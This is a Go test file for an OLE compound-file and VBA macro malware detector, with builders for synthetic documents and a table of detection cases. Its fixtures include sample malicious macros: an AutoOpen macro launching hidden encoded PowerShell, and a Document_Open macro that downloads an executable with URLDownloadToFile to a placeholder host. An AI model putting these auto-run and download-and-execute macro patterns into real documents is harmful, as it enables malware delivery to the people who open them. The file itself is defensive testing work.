package ole

import (
	"encoding/binary"
	"strings"
	"testing"
	"unicode/utf16"
)

// ── synthetic CFB builder ───────────────────────────────────────────────────────
//
// buildCFB assembles a structurally valid [MS-CFB] compound file (512-byte
// sectors, version 3) from a set of entry specs. It constructs ONLY document
// bytes for the detector to read; it never writes, weaponises or executes
// anything.
//
// To keep the builder minimal it stores EVERY stream in the regular FAT: a
// stream's content is zero-padded up to the 4096-byte mini-stream cutoff and the
// padded length is declared as the stream size, so the reader takes the regular-
// FAT path and no MiniFAT / mini-stream is needed (the mini-stream is empty). The
// detector's decompressor stops at the first invalid chunk signature, so the
// zero padding that follows an embedded CompressedContainer is ignored. The
// detector's MiniFAT path is exercised instead by the fuzz corpus.

type oleEntry struct {
	name    string
	storage bool   // true => storage object; else a stream
	content []byte // stream content; nil => a zero-length stream (no sectors)
}

func u16(v uint16) []byte { b := make([]byte, 2); binary.LittleEndian.PutUint16(b, v); return b }

func buildCFB(entries ...oleEntry) []byte {
	const (
		sectorSize = 512
		entrySize  = 128
		perFat     = sectorSize / 4 // 128 entries per FAT sector
	)

	type region struct{ start, count int }
	type built struct {
		name    string
		objType byte
		start   uint32
		size    uint64
	}

	var dataSectors [][]byte
	var regions []region

	appendRegion := func(content []byte) uint32 {
		padded := make([]byte, ((len(content)+sectorSize-1)/sectorSize)*sectorSize)
		copy(padded, content)
		start := len(dataSectors)
		for off := 0; off < len(padded); off += sectorSize {
			sec := make([]byte, sectorSize)
			copy(sec, padded[off:off+sectorSize])
			dataSectors = append(dataSectors, sec)
		}
		regions = append(regions, region{start: start, count: len(padded) / sectorSize})
		return uint32(start)
	}

	dir := []built{{name: "Root Entry", objType: objRoot, start: endOfChain, size: 0}}
	for _, e := range entries {
		switch {
		case e.storage:
			dir = append(dir, built{name: e.name, objType: objStorage, start: 0, size: 0})
		case e.content == nil:
			dir = append(dir, built{name: e.name, objType: objStream, start: endOfChain, size: 0})
		default:
			content := e.content
			if len(content) < 4096 { // force regular-FAT storage
				p := make([]byte, 4096)
				copy(p, content)
				content = p
			}
			start := appendRegion(content)
			dir = append(dir, built{name: e.name, objType: objStream, start: start, size: uint64(len(content))})
		}
	}

	// Directory stream.
	nEntries := len(dir)
	dirBytes := make([]byte, ((nEntries*entrySize+sectorSize-1)/sectorSize)*sectorSize)
	for i, de := range dir {
		base := i * entrySize
		u := utf16.Encode([]rune(de.name))
		for j, c := range u {
			if 2*j+2 <= 64 {
				binary.LittleEndian.PutUint16(dirBytes[base+2*j:], c)
			}
		}
		nameLen := (len(u) + 1) * 2
		if nameLen > 64 {
			nameLen = 64
		}
		binary.LittleEndian.PutUint16(dirBytes[base+64:], uint16(nameLen))
		dirBytes[base+66] = de.objType
		dirBytes[base+67] = 1 // color: black
		binary.LittleEndian.PutUint32(dirBytes[base+68:], noStream)
		binary.LittleEndian.PutUint32(dirBytes[base+72:], noStream)
		child := noStream
		if de.objType == objRoot && nEntries > 1 {
			child = 1
		}
		binary.LittleEndian.PutUint32(dirBytes[base+76:], child)
		binary.LittleEndian.PutUint32(dirBytes[base+116:], de.start)
		binary.LittleEndian.PutUint32(dirBytes[base+120:], uint32(de.size))
	}
	dirStart := appendRegion(dirBytes)

	// Size the FAT: F FAT sectors must cover D data sectors plus themselves.
	D := len(dataSectors)
	F := 1
	for {
		T := D + F
		need := (T + perFat - 1) / perFat
		if need <= F {
			break
		}
		F = need
	}

	fat := make([]uint32, F*perFat)
	for i := range fat {
		fat[i] = freeSect
	}
	for _, rg := range regions {
		for k := 0; k < rg.count; k++ {
			if k == rg.count-1 {
				fat[rg.start+k] = endOfChain
			} else {
				fat[rg.start+k] = uint32(rg.start + k + 1)
			}
		}
	}
	for i := 0; i < F; i++ {
		fat[D+i] = fatSect
	}
	fatBytes := make([]byte, F*sectorSize)
	for i, v := range fat {
		binary.LittleEndian.PutUint32(fatBytes[i*4:], v)
	}

	header := make([]byte, sectorSize)
	copy(header[0:8], oleSignature[:])
	binary.LittleEndian.PutUint16(header[24:], 0x003E) // minor version
	binary.LittleEndian.PutUint16(header[26:], 0x0003) // major version 3
	binary.LittleEndian.PutUint16(header[28:], 0xFFFE) // byte order
	binary.LittleEndian.PutUint16(header[30:], 0x0009) // sector shift (512)
	binary.LittleEndian.PutUint16(header[32:], 0x0006) // mini sector shift (64)
	binary.LittleEndian.PutUint32(header[44:], uint32(F))
	binary.LittleEndian.PutUint32(header[48:], dirStart)
	binary.LittleEndian.PutUint32(header[56:], 4096) // mini-stream cutoff
	binary.LittleEndian.PutUint32(header[60:], endOfChain)
	binary.LittleEndian.PutUint32(header[64:], 0)
	binary.LittleEndian.PutUint32(header[68:], endOfChain)
	binary.LittleEndian.PutUint32(header[72:], 0)
	for i := 0; i < 109; i++ {
		v := freeSect
		if i < F {
			v = uint32(D + i)
		}
		binary.LittleEndian.PutUint32(header[76+i*4:], v)
	}

	out := make([]byte, 0, sectorSize+(D+F)*sectorSize)
	out = append(out, header...)
	for _, sec := range dataSectors {
		out = append(out, sec...)
	}
	out = append(out, fatBytes...)
	return out
}

// ── synthetic MS-OVBA compressor ────────────────────────────────────────────────
//
// compressVBA produces a valid [MS-OVBA] CompressedContainer using an all-literal
// token encoding — the simplest correct container, which round-trips through
// DecompressContainer. It builds macro-source bytes for the detector to read; it
// never writes or executes a macro. Source is split into blocks well under the
// 4096-byte chunk limits so a block always fits one compressed chunk.
func compressVBA(src []byte) []byte {
	const blockSize = 2048
	out := []byte{0x01} // CompressedContainer signature
	emit := func(block []byte) {
		var chunkData []byte
		for i := 0; i < len(block); i += 8 {
			chunkData = append(chunkData, 0x00) // FlagByte: 8 literal tokens
			for j := i; j < i+8 && j < len(block); j++ {
				chunkData = append(chunkData, block[j])
			}
		}
		sizeField := len(chunkData) - 1 // (chunkData+2 header bytes) - 3
		if sizeField < 0 {
			sizeField = 0
		}
		header := uint16(0xB000) | uint16(sizeField&0x0FFF) // flag=1, sig=0b011
		out = append(out, u16(header)...)
		out = append(out, chunkData...)
	}
	if len(src) == 0 {
		emit(nil)
		return out
	}
	for start := 0; start < len(src); start += blockSize {
		end := start + blockSize
		if end > len(src) {
			end = len(src)
		}
		emit(src[start:end])
	}
	return out
}

// moduleStream wraps compressed VBA source as a module-stream body, with a short
// non-0x01 prefix standing in for the PerformanceCache that precedes the source
// in a real module stream — exercising the detector's offset scan.
func moduleStream(src string) []byte {
	prefix := []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
	return append(prefix, compressVBA([]byte(src))...)
}

func findClass(fs []Finding, class string) (Finding, bool) {
	for _, f := range fs {
		if f.Class == class {
			return f, true
		}
	}
	return Finding{}, false
}

// ── round-trip & IsOLE ──────────────────────────────────────────────────────────

func TestDecompressRoundTrip(t *testing.T) {
	cases := []string{
		"",
		"x",
		"Sub AutoOpen()\r\n    MsgBox \"hi\"\r\nEnd Sub\r\n",
		strings.Repeat("ABCDEFGH", 1000), // multi-chunk
	}
	for _, src := range cases {
		c := compressVBA([]byte(src))
		got, ok := DecompressContainer(c)
		if src == "" {
			continue // empty container intentionally yields nothing useful
		}
		if !ok {
			t.Fatalf("DecompressContainer failed for %q", truncateForMsg(src))
			continue
		}
		if string(got) != src {
			t.Fatalf("round-trip mismatch: got %d bytes, want %d", len(got), len(src))
		}
	}
}

func TestIsOLE(t *testing.T) {
	valid := buildCFB(oleEntry{name: "VBA", storage: true})
	if !IsOLE(valid) {
		t.Fatal("valid synthetic CFB not recognised")
	}
	bad := append([]byte(nil), valid...)
	bad[1] ^= 0xFF
	if IsOLE(bad) {
		t.Fatal("buffer with corrupt signature accepted")
	}
	if IsOLE([]byte{0xD0, 0xCF}) {
		t.Fatal("2-byte buffer accepted")
	}
	if IsOLE(nil) {
		t.Fatal("nil accepted")
	}
}

// ── Analyze table ──────────────────────────────────────────────────────────────

func TestAnalyze(t *testing.T) {
	benign := buildCFB(
		oleEntry{name: "VBA", storage: true},
		oleEntry{name: "dir", content: []byte("not a container")},
		oleEntry{name: "ThisDocument", content: moduleStream(
			"Attribute VB_Name = \"ThisDocument\"\r\nSub Helper()\r\n    Dim x As Integer\r\n    x = 1\r\nEnd Sub\r\n")},
	)

	malicious := buildCFB(
		oleEntry{name: "VBA", storage: true},
		oleEntry{name: "dir", content: []byte("not a container")},
		oleEntry{name: "NewMacros", content: moduleStream(
			"Attribute VB_Name = \"NewMacros\"\r\n" +
				"Sub AutoOpen()\r\n" +
				"    Shell(\"powershell -nop -w hidden -enc ZQBjAGgA\"), vbHide\r\n" +
				"End Sub\r\n")},
	)

	download := buildCFB(
		oleEntry{name: "Macros", storage: true},
		oleEntry{name: "PROJECT", content: []byte("ID=\"{...}\"")},
		oleEntry{name: "Module1", content: moduleStream(
			"Sub Document_Open()\r\n" +
				"    Dim h\r\n    Set h = CreateObject(\"MSXML2.XMLHTTP\")\r\n" +
				"    URLDownloadToFile 0, \"http://x/y.exe\", \"c:\\a.exe\", 0, 0\r\n" +
				"End Sub\r\n")},
	)

	equation := buildCFB(
		oleEntry{name: "Equation Native", content: []byte{0x1C, 0x00, 0x00, 0x00, 0x02, 0x00}},
	)

	// A compound file whose header is valid but whose FAT sector lies past the
	// truncation point: parses to nothing, with a warning, never panicking.
	truncated := append([]byte(nil), malicious[:600]...)

	garbage := append(append([]byte(nil), oleSignature[:]...), make([]byte, 600)...) // invalid sector shift

	cases := []struct {
		name         string
		data         []byte
		wantDetected bool
		wantClasses  map[string]string // class -> required technique
		absentClass  []string
		check        func(t *testing.T, r *Result)
	}{
		{
			name:         "non-OLE buffer",
			data:         []byte("MZ this is a PE, not a compound file"),
			wantDetected: false,
			check: func(t *testing.T, r *Result) {
				if r.Score != 0 || len(r.Findings) != 0 || r.Parsed != nil {
					t.Fatalf("non-OLE buffer produced analysis: %+v", r)
				}
			},
		},
		{
			name:         "benign macro document",
			data:         benign,
			wantDetected: false,
			wantClasses:  map[string]string{"ole.vba.project": techVBScript},
			absentClass:  []string{"ole.vba.autoexec", "ole.exec.powershell", "ole.exec.shell"},
			check: func(t *testing.T, r *Result) {
				if r.Parsed == nil || !r.Parsed.HasVBA {
					t.Fatalf("benign doc: HasVBA not set: %+v", r.Parsed)
				}
				if r.Parsed.Modules < 1 {
					t.Fatalf("benign doc: expected >=1 module, got %d", r.Parsed.Modules)
				}
				if r.Score >= DefaultThreshold {
					t.Fatalf("benign doc scored %d (>= threshold %d)", r.Score, DefaultThreshold)
				}
			},
		},
		{
			name:         "malicious AutoOpen + Shell(powershell)",
			data:         malicious,
			wantDetected: true,
			wantClasses: map[string]string{
				"ole.vba.autoexec":    techOfficeStartup,
				"ole.exec.powershell": techPowerShell,
				"ole.exec.shell":      techVBScript,
				"ole.vba.project":     techVBScript,
			},
			check: func(t *testing.T, r *Result) {
				if r.Parsed == nil || r.Parsed.Modules < 1 {
					t.Fatalf("malicious doc: expected a decompressed module, got %+v", r.Parsed)
				}
			},
		},
		{
			name:         "malicious Document_Open + download",
			data:         download,
			wantDetected: true,
			wantClasses: map[string]string{
				"ole.vba.autoexec":      techOfficeStartup,
				"ole.download":          techIngress,
				"ole.exec.late-binding": techVBScript,
			},
		},
		{
			name:         "equation editor lure",
			data:         equation,
			wantDetected: false, // modest weight on its own
			wantClasses:  map[string]string{"ole.lure.equation": techExploit},
			check: func(t *testing.T, r *Result) {
				if _, ok := findClass(r.Findings, "ole.lure.equation"); !ok {
					t.Fatalf("Equation Native stream not flagged: %+v", r.Findings)
				}
			},
		},
		{
			name:         "truncated CFB",
			data:         truncated,
			wantDetected: false,
			check: func(t *testing.T, r *Result) {
				if r.Score != 0 {
					t.Fatalf("truncated CFB scored %d, want 0", r.Score)
				}
				if r.Parsed == nil || r.Parsed.Warning == "" {
					t.Fatalf("expected a parse warning on truncation, got %+v", r.Parsed)
				}
			},
		},
		{
			name:         "garbage after a valid signature",
			data:         garbage,
			wantDetected: false,
			check: func(t *testing.T, r *Result) {
				if r.Score != 0 {
					t.Fatalf("garbage scored %d, want 0", r.Score)
				}
				if r.Parsed == nil || r.Parsed.Warning == "" {
					t.Fatalf("expected a parse warning, got %+v", r.Parsed)
				}
			},
		},
		{
			name:         "empty buffer",
			data:         nil,
			wantDetected: false,
			check: func(t *testing.T, r *Result) {
				if r == nil || r.Score != 0 || r.Parsed != nil {
					t.Fatalf("empty buffer: unexpected result %+v", r)
				}
			},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := Analyze(tc.data, Options{})
			if r == nil {
				t.Fatal("Analyze returned nil")
			}
			if got := r.Detected(); got != tc.wantDetected {
				t.Fatalf("Detected()=%v, want %v (score %d, threshold %d, findings %+v)",
					got, tc.wantDetected, r.Score, r.EffectiveThreshold(), r.Findings)
			}
			for class, tech := range tc.wantClasses {
				f, ok := findClass(r.Findings, class)
				if !ok {
					t.Fatalf("missing finding class %q; got %+v", class, r.Findings)
				}
				if f.Technique != tech {
					t.Fatalf("class %q technique=%q, want %q", class, f.Technique, tech)
				}
			}
			for _, class := range tc.absentClass {
				if _, ok := findClass(r.Findings, class); ok {
					t.Fatalf("unexpected finding class %q present; got %+v", class, r.Findings)
				}
			}
			if tc.check != nil {
				tc.check(t, r)
			}
			// The reported score always equals the sum of the finding weights.
			sum := 0
			for _, f := range r.Findings {
				sum += f.Score
			}
			if sum != r.Score {
				t.Fatalf("score %d != finding sum %d", r.Score, sum)
			}
		})
	}
}

func TestScanFileMissing(t *testing.T) {
	r := ScanFile("/no/such/document.doc", Options{})
	if r == nil {
		t.Fatal("ScanFile returned nil")
	}
	if r.Skipped == "" {
		t.Fatalf("expected Skipped for a missing file, got %+v", r)
	}
	if r.Detected() {
		t.Fatal("a skipped scan must not report Detected")
	}
}

func TestClassesCatalog(t *testing.T) {
	allowed := map[string]bool{
		techVBScript: true, techOfficeStartup: true, techUserExec: true,
		techPowerShell: true, techCmd: true, techIngress: true,
		techObfuscation: true, techExploit: true,
	}
	cls := Classes()
	if len(cls) == 0 {
		t.Fatal("Classes() is empty")
	}
	seen := map[string]bool{}
	for _, c := range cls {
		key := c.Class + "|" + c.Technique
		if seen[key] {
			t.Fatalf("duplicate catalog entry %q", key)
		}
		seen[key] = true
		if !allowed[c.Technique] {
			t.Fatalf("class %q uses unexpected technique %q", c.Class, c.Technique)
		}
		if c.Novel != "" {
			t.Fatalf("class %q must map to an established technique, has Novel=%q", c.Class, c.Novel)
		}
		if c.Weight <= 0 || c.Description == "" {
			t.Fatalf("class %q has no weight/description: %+v", c.Class, c)
		}
	}
}

func truncateForMsg(s string) string {
	if len(s) > 40 {
		return s[:40] + "..."
	}
	return s
}
